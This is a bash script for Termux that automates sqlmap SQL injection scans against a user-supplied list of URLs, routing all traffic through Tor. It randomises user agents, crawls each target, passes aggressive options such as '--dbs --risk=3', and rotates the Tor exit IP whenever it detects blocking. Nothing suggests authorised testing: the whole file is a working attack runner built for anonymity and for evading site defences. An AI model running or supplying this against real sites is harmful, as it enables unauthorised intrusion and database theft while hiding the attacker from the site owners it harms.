#!/data/data/com.termux/files/usr/bin/bash

# Colors
GREEN="\033[1;32m"
RED="\033[1;31m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
CYAN="\033[1;36m"
RESET="\033[0m"

echo -e "${GREEN}🛡️  SQLMap via Tor - Smart Auto Runner [SqlTor4.sh]${RESET}"

# Check Tor running
if ! pgrep -x tor > /dev/null; then
    echo -e "${YELLOW}[+] Starting Tor...${RESET}"
    tor & sleep 5
else
    echo -e "${GREEN}[✓] Tor is already running${RESET}"
fi

# Input
read -p "📁 Enter URL list file: " url_file
[[ ! -f "$url_file" ]] && echo -e "${RED}[!] File not found${RESET}" && exit 1

read -p "⚙️  Extra SQLMap options (e.g. --dbs --risk=3): " extra_opts
read -p "🌀 Crawl level (default 1): " crawl_level
crawl_level="${crawl_level:-1}"

# Logs
mkdir -p logs
output_csv="$HOME/.local/share/sqlmap/output/results-$(date '+%m%d%Y_%I%M%p').csv"

# IP before
echo -ne "➡️  Tor IP before scan: "
tor_ip_before=$(torsocks curl -s https://ifconfig.me)
echo -e "${BLUE}${tor_ip_before}${RESET}"

# Start scanning
total=$(grep -cve '^\s*$' "$url_file")
count=0

while IFS= read -r url; do
    [[ -z "$url" ]] && continue
    count=$((count + 1))

    echo -e "\n${YELLOW}[${count}/${total}] 🔍 Target: $url${RESET}"

    # Create log file
    log_name=$(echo "$url" | sed 's|https\?://||; s|[/?=&]|_|g')
    log_file="logs/${log_name}.log"

    start_time=$(date +%s)

    echo -e "${CYAN}🚀 Running SQLMap...${RESET}"
    torsocks python3 sqlmap/sqlmap.py -u "$url" \
        --random-agent \
        --crawl="$crawl_level" \
        --delay=3 \
        --timeout=20 \
        --retries=2 \
        --batch \
        --tor \
        --tor-type=SOCKS5 \
        $extra_opts 2>&1 | tee "$log_file"

    end_time=$(date +%s)
    duration=$((end_time - start_time))
    [[ $duration -lt 10 ]] && duration=10

    echo -ne "${YELLOW}📋 Status: ${RESET}"
    if grep -q "\[INFO\] testing" "$log_file"; then
        echo -e "${GREEN}✓ SQLMap executed${RESET}"
    else
        echo -e "${RED}✗ No activity – likely blocked or failed${RESET}"
    fi

    # Show vulnerability summary
    echo -e "${BLUE}🧪 Vulnerability Summary:${RESET}"
    grep -E "parameter|sql injection|back-end DBMS" "$log_file" | uniq | sed 's/^/   - /'

    # Tor IP after scan
    echo -ne "⬅️  Tor IP after: "
    tor_ip_after=$(torsocks curl -s https://ifconfig.me)
    echo -e "${BLUE}${tor_ip_after}${RESET}"

    # Block detection: If IP is same, or no result
    if [[ "$tor_ip_before" == "$tor_ip_after" ]] || ! grep -q "\[INFO\] testing" "$log_file"; then
        echo -e "${YELLOW}🔁 Rotating Tor IP...${RESET}"
        pkill -HUP tor
        sleep 10
        tor_ip_before=$(torsocks curl -s https://ifconfig.me)
        echo -e "${BLUE}🔄 New Tor IP: ${tor_ip_before}${RESET}"
    fi

    echo -e "${CYAN}📝 Log saved: ${log_file}${RESET}"
    echo "-----------------------------------------------"

    echo -e "⏱️  Sleeping for ${duration}s before next scan..."
    sleep "$duration"

done < "$url_file"

echo -e "${GREEN}✅ All scans complete.${RESET}"
echo -e "📄 CSV Summary: ${output_csv}"
